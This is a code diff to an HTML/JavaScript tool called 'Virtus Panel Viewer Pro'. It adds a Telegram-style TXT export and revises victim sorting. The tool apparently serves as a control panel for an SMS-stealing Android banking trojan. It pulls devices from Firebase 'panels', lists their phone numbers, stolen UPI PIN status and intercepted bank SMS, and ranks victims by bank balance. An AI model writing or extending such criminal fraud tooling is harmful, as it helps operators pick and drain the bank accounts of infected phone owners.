@@ -462,13 +462,14 @@
     <div class="brand-icon">💰</div>
     <div>
       <h1>Virtus Panel Viewer Pro</h1>
-      <p id="appBuildTag" style="font-size:0.65rem;color:#ff8a80;margin-top:2px;font-weight:700">Build 1.0.4 · Live SMS</p>
+      <p id="appBuildTag" style="font-size:0.65rem;color:#ff8a80;margin-top:2px;font-weight:700">Build 1.0.5 · Live SMS + Export</p>
     </div>
   </div>
   <div class="actions">
     <label class="btn" style="cursor:pointer">📂 TXT<input type="file" id="fileInput" accept=".txt" hidden></label>
     <button class="btn btn-fire" id="fetchBtn">⚡ Fetch Live</button>
     <button class="btn live-on" id="liveSmsToggle" type="button">🔴 Live SMS ON</button>
+    <button class="btn" type="button" id="exportTxtBtn" title="Telegram bot jaisa result TXT">📥 Export TXT</button>
     <span id="panelCount" style="color:var(--muted);font-size:0.75rem">0 panels</span>
   </div>
 </div>
@@ -2557,81 +2558,83 @@ function closeModal(e) {
   }, 100);
 }
 
-/** Bot jaisa result TXT — High Balance upar */
+function buildExportHeader() {
+  const pinPart = (() => {
+    const p = activeFilters.has('pin');
+    const n = activeFilters.has('nopin');
+    if (p && n) return 'PIN: WITH + WITHOUT PIN';
+    if (p) return 'PIN: WITH PIN';
+    if (n) return 'PIN: WITHOUT PIN';
+    return 'PIN: ALL';
+  })();
+  const statPart = (() => {
+    const on = activeFilters.has('online');
+    const off = activeFilters.has('offline');
+    if (on && !off) return 'ONLINE DEVICES ONLY';
+    if (off && !on) return 'OFFLINE DEVICES ONLY';
+    return 'ONLINE + OFFLINE';
+  })();
+  const sortPart = currentSort === 'balance_low' ? 'BAL LOW->HIGH' : 'BAL HIGH->LOW';
+  const dayPart = globalSmsDays === 0 ? 'ALL TIME' : `LAST ${globalSmsDays} DAY(S)`;
+  return `SMS SEARCH RESULTS- AVL/BAL & BANK- ${statPart}- ${pinPart}- ${sortPart}- ${dayPart}`;
+}
+
+/** Telegram Panel search virtus bot jaisa TXT */
 function exportTxt(auto = false) {
   if (!allDevices.length) {
     setStatus('Pehle Fetch Live karo', 'err');
     return;
   }
 
-  const sorted = [...allDevices]
-    .filter(d => d.maxBalance > 0 || (d.bankSms && d.bankSms.length))
-    .sort((a, b) => b.maxBalance - a.maxBalance || (b.status - a.status));
+  const base = smsFetchActive ? getFetchTargetDevices() : getFiltered();
+  const sorted = [...base].filter(d => d.smsLoaded && (d.bankSms?.length || d.maxBalance > 0));
+  sorted.sort((a, b) => {
+    if (currentSort === 'balance_low') {
+      return (getDeviceSortAmount(a) || Infinity) - (getDeviceSortAmount(b) || Infinity);
+    }
+    return getDeviceSortAmount(b) - getDeviceSortAmount(a) || (b.status - a.status);
+  });
 
   if (!sorted.length) {
-    setStatus('Abhi koi bank balance nahi mila — thoda wait karke dubara try karo', 'err');
+    setStatus('Filter match + bank SMS nahi — Start Fetch pehle karo', 'err');
     return;
   }
 
-  const online = allDevices.filter(d => d.status).length;
-  const ts = new Date().toLocaleString('en-IN');
+  const ts = new Date().toLocaleString('en-IN', { hour12: false }).replace(',', '');
+  const smsTotal = sorted.reduce((s, d) => s + (d.bankSms?.length || 0), 0);
   const lines = [
-    '═'.repeat(50),
-    '✅ VIRTUS PANEL SEARCH',
-    `📊 High → Low | ${ts}`,
-    `📦 Devices: ${allDevices.length} | Online: ${online} | With Balance: ${sorted.filter(d=>d.maxBalance>0).length}`,
-    '═'.repeat(50),
+    buildExportHeader(),
+    ts,
+    `Stats: Total Matches: ${smsTotal} | Devices: ${sorted.length} | DBs done: ${panels.length}/${panels.length}`,
     ''
   ];
 
   sorted.forEach((d, i) => {
-    const bal = d.maxBalance ? fmtBal(d.maxBalance) : '—';
-    lines.push(`#${i + 1} | ${bal} | ${d.status ? '🟢 Online' : '⚫ Offline'} | ${d.name}`);
+    const smsList = [...(d.bankSms || [])].sort(sortByRecent);
+    lines.push(`----------------+#[${i + 1}]-----------------`);
     lines.push(`Device ID: ${d.id}`);
-    lines.push(`Phone: ${fmtPhone(d.phone)} | Battery: ${d.battery} | Android: ${d.android}`);
-    lines.push(`Panel: ${d.panelName}`);
-    lines.push(`FB: ${d.panelUrl}`);
-    if (d.upipin) lines.push(`PIN: ${d.upipin}`);
-    lines.push('');
-
-    if (d.bankSms && d.bankSms.length) {
-      lines.push('── Bank SMS (Recent → Old) ──');
-      [...d.bankSms].sort(sortByRecent).forEach(m => {
-        const amt = m.avlAmount || m.txnAmount;
-        lines.push(`[${fmtBal(amt)}] ${m.sender} | ${m.time}`);
-        lines.push(m.text);
-        lines.push('');
-      });
+    lines.push(`UPI PIN: ${hasPin(d) ? 'YES' : 'NO'}`);
+    if (d.maxBalance) lines.push(`Peak Avl Bal: ${fmtBal(d.maxBalance)}`);
+    lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | Panel: ${d.panelName || '—'}`);
+    smsList.forEach((m, j) => {
+      lines.push(`  ${j + 1}. [${m.sender}] ${m.text}`);
+    });
+    if (!smsList.length && d.maxBalance) {
+      lines.push(`  (balance matched, SMS list empty in ${getSmsDaysLabel()})`);
     }
-    if (d.creditCardSms && d.creditCardSms.length) {
-      lines.push('── Credit Card SMS (Recent → Old) ──');
-      [...d.creditCardSms].sort(sortByRecent).forEach(m => {
-        const amt = m.txnAmount || m.sortAmount;
-        lines.push(`[💳 ${fmtBal(amt)}] ${m.sender} | ${m.time}`);
-        lines.push(m.text);
-        lines.push('');
-      });
-    } else if (d.maxBalance > 0 && !(d.bankSms && d.bankSms.length)) {
-      lines.push(`Avl Balance: ${bal}`);
-      lines.push('');
-    }
-    lines.push('-'.repeat(40));
     lines.push('');
   });
 
-  lines.push('═'.repeat(50));
-  lines.push(`Total: ${sorted.length} | Virtus Panel Viewer Pro`);
-  lines.push('═'.repeat(50));
-
+  const fname = `sms_avlbal_bank_${Date.now()}.txt`;
   const blob = new Blob([lines.join('\n')], { type: 'text/plain;charset=utf-8' });
   const a = document.createElement('a');
   a.href = URL.createObjectURL(blob);
-  a.download = `high_balance_${Date.now()}.txt`;
+  a.download = fname;
   a.click();
   URL.revokeObjectURL(a.href);
 
-  setStatus(`📥 TXT downloaded! ${sorted.length} devices · High balance upar`, 'ok');
-  toast(auto ? 'Auto TXT download ho gaya!' : 'TXT download!');
+  setStatus(`📥 ${fname} · ${sorted.length} devices · Telegram format`, 'ok');
+  toast(auto ? 'Export ho gaya' : 'TXT download');
 }
 function setStatus(msg, cls) {
   const el = document.getElementById('status');
@@ -2685,6 +2688,7 @@ document.getElementById('pasteLoadBtn').addEventListener('click', () => {
 });
 
 document.getElementById('fetchBtn').addEventListener('click', () => fetchAllPanels());
+document.getElementById('exportTxtBtn')?.addEventListener('click', () => exportTxt());
 document.getElementById('searchBox').addEventListener('input', e => { searchQuery = e.target.value; render(); });
 
 document.querySelectorAll('[data-filter]').forEach(b => b.addEventListener('click', () => {
